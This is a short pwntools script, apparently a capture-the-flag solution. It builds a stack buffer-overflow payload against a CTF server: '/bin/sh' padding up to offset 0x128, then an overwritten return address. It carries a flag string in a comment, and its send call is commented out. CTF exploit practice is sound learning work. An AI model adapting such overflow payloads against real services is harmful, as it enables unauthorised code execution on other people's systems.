#!/usr/bin/env python
from pwn import *

# AD{We1c0me_h4cker!_:P}

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10108
y = remote( host , port )

p = '/bin/sh\x00'
p += 'D' * ( 0x128 - len( p ) )
p += p64( 0x4000ed )
p += 'a' * ( 322 - len( p ) )

#y.send( p )


y.interactive()